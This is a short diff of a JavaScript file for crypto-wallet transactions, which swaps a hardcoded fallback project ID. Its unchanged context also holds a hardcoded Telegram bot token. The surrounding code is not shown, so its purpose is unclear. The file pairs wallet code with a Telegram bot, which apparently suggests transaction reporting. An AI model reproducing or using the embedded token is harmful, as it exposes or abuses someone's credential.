@@ -43,7 +43,7 @@ const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
 }
 
 // Конфигурация
-const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
+const projectId = import.meta.env.VITE_PROJECT_ID || 'd1def8789669a103d8e57b8c06dbb7d1'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7336912367:AAEr0_1Cd8HVJl-3roQkg_WkI88YNASpKpo'
